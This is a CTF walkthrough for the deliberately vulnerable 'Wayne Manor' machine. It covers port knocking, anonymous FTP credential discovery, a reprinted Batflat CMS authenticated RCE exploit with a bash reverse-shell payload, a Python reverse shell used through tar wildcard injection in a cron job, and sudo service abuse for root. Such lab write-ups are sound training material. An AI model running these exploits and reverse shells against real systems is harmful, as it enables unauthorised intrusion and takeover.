# Wayne Manor _Writeup_
### B2R machine created for the MoonFHunters CTF.

This machine was created by user @sec_balkan.

Content:
- Port Knocking.
- RCE (Remote Code Execution).
- Cronjobs.
- Sudoers.

![](https://raw.githubusercontent.com/sec-balkan/Vulnerable_Machines/main/wayne_manor/img/Wayne_Manor.jpg)

### About:

- Tested en VMWare.
- DHCP is enabled.
- Add to file _/etc/hosts_:
```sh
<ip> waynemanor.com
```


### _Walktrought_:

Once we have access to the machine and know its IP address, we scan all available services.

```sh
┌──(root💀kali)-[/home/kali]
└─# nmap -sT -p- --open -T5 --min-rate 10000 -n <ip>
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-11 16:49 EDT
Nmap scan report for 192.168.51.131
Host is up (0.0012s latency).
Not shown: 65533 closed ports

PORT   STATE SERVICE
80/tcp open  http
MAC Address: 00:0C:29:51:07:3F (VMware)

Nmap done: 1 IP address (1 host up) scanned in 4.01 seconds
```
```sh
┌──(root💀kali)-[/home/kali]
└─# nmap -sC -sV -p80 <ip>
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-11 16:50 EDT
Nmap scan report for waynemanor.com (192.168.51.131)
Host is up (0.00050s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-generator: Batflat
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Wayne Manor Blog - Wayne Manor
MAC Address: 00:0C:29:51:07:3F (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.75 seconds
```

Based on the results obtained, we see that we have the _HTTP_ service open, we access its web page, where we can see a _CMS_, as indicated by _nmap_ and inspecting _Wayne Manor Blog - Wayne Manor_, the _CMS_ is called _Batflat_, and inside it, there is a post.

![](https://raw.githubusercontent.com/sec-balkan/Vulnerable_Machines/main/wayne_manor/img/web.PNG)

![](https://raw.githubusercontent.com/sec-balkan/Vulnerable_Machines/main/wayne_manor/img/publicacion.PNG)

> Knock the door in front of the mansion.
> Written by Bruce Wayne on September 19, 1939.

> Alfred is warned to only let in about 300, 350, 400 people, but sometimes, if all those people come in, a secret room is opened, so people can Finish The Party.

Doing some _guessing_ we conclude that we have to do _port knocking_ to ports _300, 350 and 400_ to open the _FTP_ service.

First, we will check if the _FTP_ service is available, then with _telnet_ we will send requests to the _3_ ports, and then we will check if port _21_ is opened.

```sh
nc -nv <ip> 21 || telnet <ip> 300 || telnet <ip> 350 || telnet <ip> 400 || nmap -sC -sV -p21 <ip>
```

```sh
┌──(root💀kali)-[/home/kali]
└─#  <copypaste del comando anterior>

nc -nv <ip> 21
(UNKNOWN) [192.168.51.131] 21 (ftp) : Connection refused

Trying 192.168.51.131...
telnet: Unable to connect to remote host: Connection refused

Trying 192.168.51.131...
telnet: Unable to connect to remote host: Connection refused

Trying 192.168.51.131...
telnet: Unable to connect to remote host: Connection refused

Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-11 16:57 EDT
Nmap scan report for waynemanor.com (192.168.51.131)
Host is up (0.00048s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             263 Mar 26 23:03 info.txt
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:192.168.51.129
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
MAC Address: 00:0C:29:51:07:3F (VMware)
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 0.69 seconds
```

Once opened, we enter through the anonymous login, and in a _.txt_ file we will find a text with some credentials.

```sh
┌──(root💀kali)-[/home/kali]
└─# ftp <ip>
Connected to 192.168.51.131.
220 (vsFTPd 3.0.3)
Name (192.168.51.131:kali): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0             263 Mar 26 23:03 info.txt
226 Directory send OK.
ftp> get info.txt
local: info.txt remote: info.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for info.txt (263 bytes).
226 Transfer complete.
263 bytes received in 0.10 secs (2.5864 kB/s)
ftp> exit
221 Goodbye.
```

_info.txt_ content:

>Hi Bruce!
>Here are the credentials for the website (you are a bit forgetful).
>I hope you didn't find 'Port Knocking' too difficult.
>By the way, you are meeting Dick at 19:00 for coffee before the party at home.
>USER: bruce
>PASS: alfred_help_me (Hahahahahaha)

Once we have some credentials, we will try to authenticate against our _CMS_ hosted on the _HTTP_ service.

![](https://raw.githubusercontent.com/sec-balkan/Vulnerable_Machines/main/wayne_manor/img/batflat1.PNG)

As we can see, the credentials are valid, now, we will look for possible exploits for our _CMS_.

![](https://raw.githubusercontent.com/sec-balkan/Vulnerable_Machines/main/wayne_manor/img/batflat%202.PNG)

With a simple search with the _searchsploit_ tool, we find a possible exploit on the [exploitdb] page (Batflat CMS 1.3.6 - Authenticated Remote Code Execution), finally with _searchsploit -m <exploit>_ we bring the file to the current directory.

[exploitdb]: https://www.exploit-db.com/exploits/49573

```sh
┌──(root💀kali)-[/home/kali]
└─# searchsploit batflat 
--------------------------------------------------- ---------------------------------
 Exploit Title                                     |  Path
--------------------------------------------------- ---------------------------------
Batflat CMS 1.3.6 - 'multiple' Stored XSS          | php/webapps/49583.txt
Batflat CMS 1.3.6 - Remote Code Execution (Authent | php/webapps/49573.py
--------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```

```py
# Exploit Title: Batflat CMS 1.3.6 - Remote Code Execution (Authenticated)
# Date: 2020-12-27
# Exploit Author: mari0x00
# Vendor Homepage: https://batflat.org/
# Software Link: https://github.com/sruupl/batflat/archive/master.zip
# Description: https://secator.pl/index.php/2021/02/15/batflat-v-1-3-6-authenticated-remote-code-execution-public-disclosure/
# Version: <= 1.3.6
# CVE: CVE-2020-35734

#!/usr/bin/python3

import requests
import sys
import re
from bs4 import BeautifulSoup
from termcolor import colored
from time import sleep

print(colored('''###########################################################''',"red"))
print(colored('''#######    Batflat authenticated RCE by mari0x00    #######''',"red"))
print(colored('''###########################################################''',"red"))
print("")

if len(sys.argv) != 6:
    print((colored("[~] Usage : python3 batpwnd.py <url> <username> <password> <IP> <PORT>","red")))
    print((colored("[~] Default credentials: admin/admin","red")))
    print((colored("[~] Example: python3 batpwnd.py http://192.168.101.105/ admin admin 192.168.101.101 4444","red")))
    exit()
url = sys.argv[1]
username = sys.argv[2]
password = sys.argv[3]
IP = sys.argv[4]
PORT = sys.argv[5]


#Start session
s = requests.Session()
headers = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0'}


#Authenticate
print((colored("[+] Attempting user login","blue")))

login_data = {
    "username": username,
    "password": password,
    "login": "",
   }

login = s.post(url+"admin/", login_data, headers=headers)
sleep(0.5)

#Get token
print((colored("[+] Retrieving the token","blue")))
r = s.get(url+"admin/", headers=headers).content
soup = BeautifulSoup(r, "lxml")
token = (re.search(r't=(.*?)">Add', str(soup)).group(1))
print((colored("[+] Token ID: " + token,"blue")))
sleep(0.5)

#Get URL
print((colored("[+] Getting the add-user endpoint URL","blue")))
r = s.get(url+"admin/users/add?t="+token, headers=headers).content
soup = BeautifulSoup(r, "lxml")
add_user_url = (re.search(r'action="(.*?)"', str(soup)).group(1))
sleep(0.5)

#Exploit
print((colored("[+] Adding pwnd user","blue")))
payload = "<?php system(\"/bin/bash -c 'bash -i >& /dev/tcp/" + IP + "/" + PORT + " 0>&1'\");?>"

add_user = {
    "username": (None, "pwnd"),
    "fullname": (None, payload),
    "description": (None, "pwnd"),
    "email": (None, "pwnd@evil.com"),
    "password": (None, "pwnd123"),
    "access[]": (None, "users"),
    "save": (None, "Save")
}

exploit = s.post(add_user_url, headers=headers, files=add_user)
sleep(0.5)

#Triggering reverse shell
print("")
print((colored("[+] Triggering the shell. Go nuts!","green")))
r = s.get(url+"admin/users/manage?t="+token, headers=headers)
```

We will take advantage of the fact that it does not filter the user's surname when it is added, and there we will put our code, in this case a *bash tcp reverse shell*.

We launch it as indicated by the exploit _(python3 batpwnd.py <url> <username> <password> <IP>)_ (while listening on a specific port, in this case port 80) and get a shell as the user _www-data_.

```sh
┌──(kali㉿kali)-[/tmp]
└─$ python3 49573.py http://waynemanor.com/ bruce alfred_help_me 192.168.51.129 80
###########################################################
#######    Batflat authenticated RCE by mari0x00    #######
###########################################################

[+] Attempting user login
[+] Retrieving the token
[+] Token ID: f9567c6b53d8
[+] Getting the add-user endpoint URL
[+] Adding pwnd user

[+] Triggering the shell. Go nuts!
```

```sh
┌──(kali㉿kali)-[~]
└─$ sudo rlwrap nc -nlvp 80 
listening on [any] 80 ...
connect to [192.168.51.129] from (UNKNOWN) [192.168.51.131] 46802
bash: cannot set terminal process group (827): Inappropriate ioctl for device
bash: no job control in this shell
www-data@waynemanor:~/html/batflat/admin$
```

Now with a shell as the user _www-data_ we will start the privilege escalation.

Then we download the _pspy_ binary (process monitoring tool) and put it on the computer to see in real time which processes are running.

```sh
www-data@waynemanor:/tmp$ wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64
--2021-04-14 18:06:53--  https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64
Resolving github.com (github.com)... 140.82.121.4
Connecting to github.com (github.com)|140.82.121.4|:443... connected.
HTTP request sent, awaiting response... 302 Found
Location: https://github-releases.githubusercontent.com/120821432/d54f2200-c51c-11e9-8d82-f178cd27b2cb?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-
Resolving github-releases.githubusercontent.com (github-releases.githubusercontent.com)... 185.199.111.154, 185.199.108.154, 185.199.110.154, ...
Connecting to github-releases.githubusercontent.com (github-releases.githubusercontent.com)|185.199.111.154|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3078592 (2.9M) [application/octet-stream]
Saving to: ‘pspy64’

pspy64                                          100%[====================================================================================================>]   2.94M  10.2MB/s    in 0.3s

2021-04-14 18:06:54 (10.2 MB/s) - ‘pspy64’ saved [3078592/3078592]

www-data@waynemanor:/tmp$ chmod +x pspy64
```

Run the binary and different processes from different users will appear.

```sh
www-data@waynemanor:/tmp$ ./pspy64
pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855


     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░
                   ░           ░ ░
                               ░ ░

Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scannning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
Draining file system events due to startup...
done
2021/04/14 18:08:32 CMD: UID=0    PID=99     |
2021/04/14 18:08:32 CMD: UID=33   PID=983    | php-fpm: pool www
2021/04/14 18:08:32 CMD: UID=33   PID=982    | php-fpm: pool www
```

Wait for a minute or so (the time it takes for the cron to run), and you will see a script run automatically.

```
2021/04/14 18:09:01 CMD: UID=1000 PID=1938   |
2021/04/14 18:09:01 CMD: UID=1000 PID=1939   | /bin/bash /home/batman/.web/script.sh
2021/04/14 18:09:01 CMD: UID=1000 PID=1940   | tar -zcf /tmp/web.tar.gz batflat index.nginx-debian.html robots.txt
2021/04/14 18:09:01 CMD: UID=1000 PID=1941   | tar -zcf /tmp/web.tar.gz batflat index.nginx-debian.html robots.txt
```

This means that the user with UID 1000 (batman), runs that binary every minute, so let's see which binary he runs and what it is actually doing.

```sh
www-data@waynemanor:~$ cat /home/batman/.web/script.sh
#!/bin/bash

cd /var/www/html && tar -zcf /tmp/web.tar.gz *

#TO DO: Improve the script.
```

As we can see, with the _tar_ tool it backs up the whole web page (*), so, by using the asterisk to refer to all files, we can abuse that misconfiguration of the _wildcard_ (more information [here](https://int0x33.medium.com/day-67-tar-cron-2-root-abusing-wildcards-for-tar-argument-injection-in-root-cronjob-nix-c65c59a77f5e) and [here](https://gtfobins.github.io/gtfobins/tar/#sudo)).

In short, what we are going to do is to add two arguments to the cron script, so that it executes a binary that we indicate to it.

This is the original script:

```sh
tar -zcf /tmp/web.tar.gz *
```

And thanks to the _wildcard_ (asterisk) we will add two arguments that will execute a malicious binary:

```sh
tar -zcf /tmp/web.tar.gz --checkpoint=1 --checkpoint-action=exec=python3 privesc.py
```

How? By creating two files in the _/var/www/html_ directory.

The first thing we will do is to create a reverse shell in _python_ (more information [here](https://ironhackers.es/herramientas/reverse-shell-cheat-sheet/).

Contents of _privesc.py_ in the _/var/www/html_ directory:

```py
import socket
import os
import subprocess

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("<ip>",<puerto>));
os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);
p=subprocess.call(["/bin/bash","-i"]);
```

We create the files in the directory _/var/www/html_:

```
echo "" > "--checkpoint-action=exec=python3 privesc.py"
echo "" > --checkpoint=1
```

Now just wait for the cron to run, and as soon as it does (+- 1'), you will get a bash shell on your computer listening to _`nc -nlvp <port>`_.

```sh
┌──(kali㉿kali)-[~]
└─$ sudo rlwrap nc -nlvp 22
listening on [any] 22 ...
connect to [192.168.51.129] from (UNKNOWN) [192.168.51.131] 40158
bash: cannot set terminal process group (63085): Inappropriate ioctl for device
bash: no job control in this shell
batman@waynemanor:/var/www/html$
```

Once we are the batman user, we will be able to see the flag located in the _/home/batman/local.txt_ directory.

```console
bash-5.0$ cat /home/batman/local.txt

I left the party... I saw the call... I had to go... Gotham City needs me...


 :::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
 :::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
 :::::::::::::::::::::::::::::::::::::::::::::-'    `-::::::::::::::::::
 ::::::::::::::::::::::::::::::::::::::::::-'          `::::::::::::::::
 :::::::::::::::::::::::::::::::::::::::-  '   /(_M_)\  `:::::::::::::::
 :::::::::::::::::::::::::::::::::::-'        |       |  :::::::::::::::
 ::::::::::::::::::::::::::::::::-         .   \/~V~\/  ,:::::::::::::::
 ::::::::::::::::::::::::::::-'             .          ,::::::::::::::::
 :::::::::::::::::::::::::-'                 `-.    .-::::::::::::::::::
 :::::::::::::::::::::-'                  _,,-::::::::::::::::::::::::::
 ::::::::::::::::::-'                _,--:::::::::::::::::::::::::::::::
 ::::::::::::::-'               _.--::::::::::::::::::::::#####:::::::::
 :::::::::::-'             _.--:::::::::::::::::::::::::::#####:::::####
 ::::::::'    ##     ###.-::::::###:::::::::::::::::::::::#####:::::####
 ::::-'       ###_.::######:::::###::::::::::::::#####:##########:::####
 :'         .:###::########:::::###::::::::::::::#####:##########:::####
      ...--:::###::########:::::###:::::######:::#####:##########:::####
  _.--:::##:::###:#########:::::###:::::######:::#####:#################
 '#########:::###:#########::#########::######:::#####:#################
 :#########:::#############::#########::######:::#######################
 ##########:::########################::################################
 ##########:::##########################################################
 ##########:::##########################################################
 #######################################################################
 #######################################################################
 #################################################################### ##
 #######################################################################

                   e*******************************
```

To root, we will run the command _sudo -l_ to see the binaries that we can run as other users.

```sh
batman@waynemanor:/var/www/html$ sudo -l
sudo -l
Matching Defaults entries for batman on waynemanor:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User batman may run the following commands on waynemanor:
    (root) NOPASSWD: /usr/sbin/service
batman@waynemanor:/var/www/html$
```

Finally, the _/etc/sudoers_ file tells us that we can run _/usr/sbin/service_ as the root user (more information [here](https://gtfobins.github.io/gtfobins/service/#sudo).

We will abuse this configuration with the command:

```sh
sudo service ../../bin/bash
```

```sh
batman@waynemanor:/$ sudo service ../../bin/bash
sudo service ../../bin/bash
whoami
root
id
uid=0(root) gid=0(root) groups=0(root)
groups
root
```

Now we can read the root flag (proof.txt) stored in _/root/proof.txt_.

```console
cat /root/proof.txt

Rescue a cat? Unbelievable, I had to leave that journalist who works at 'The Gotham Times' for this animal...

Well... I'll have to get back to the party, Alfred needs me.


                 T\ T\
                 | \| \
                 |  |  :
            _____I__I  |
          .'            '.
        .'                '
        |   ..             '
        |  /__.            |
        :.' -'             |
       /__.                |
      /__, \               |
         |__\        _|    |
         :  '\     .'|     |
         |___|_,,,/  |     |    _..--.
      ,--_-   |     /'      \../ /  /\\
     ,'|_ I---|    7    ,,,_/ / ,  / _\\
   ,-- 7 \|  / ___..,,/   /  ,  ,_/   '-----.
  /   ,   \  |/  ,____,,,__,,__/            '\
 ,   ,     \__,,/                             |
 | '.       _..---.._                         !.
 ! |      .'  _ __ . '.                        |
 .:'      | (-_ _--')  :          L            !
 .'.       '.  Y    _.'             \,         :
  .          '-----'                 !          .
  .           /  \                   .          .



    3*******************************


***************************************************************************************************************************

Congratulations for compromising my first vulnerable machine!

You can follow me on Twitter (@sec_balkan), GitHub (@sec-balkan) or send me a message on Telegram (@sec_balkan).

Thank you!
```

Another _writeups_:

+ https://www.youtube.com/watch?v=SMCvn2Rmhmg by **Proxy Programmer**
+ https://songbird0x1337.gitbook.io/wayne_manor/ by **SongBird0x1337**
+ http://www.vxer.cn/?id=74 by **Windy**

<p align="center">
  <img src="https://raw.githubusercontent.com/sec-balkan/Vulnerable_Machines/main/wayne_manor/img/bat.gif">
</p>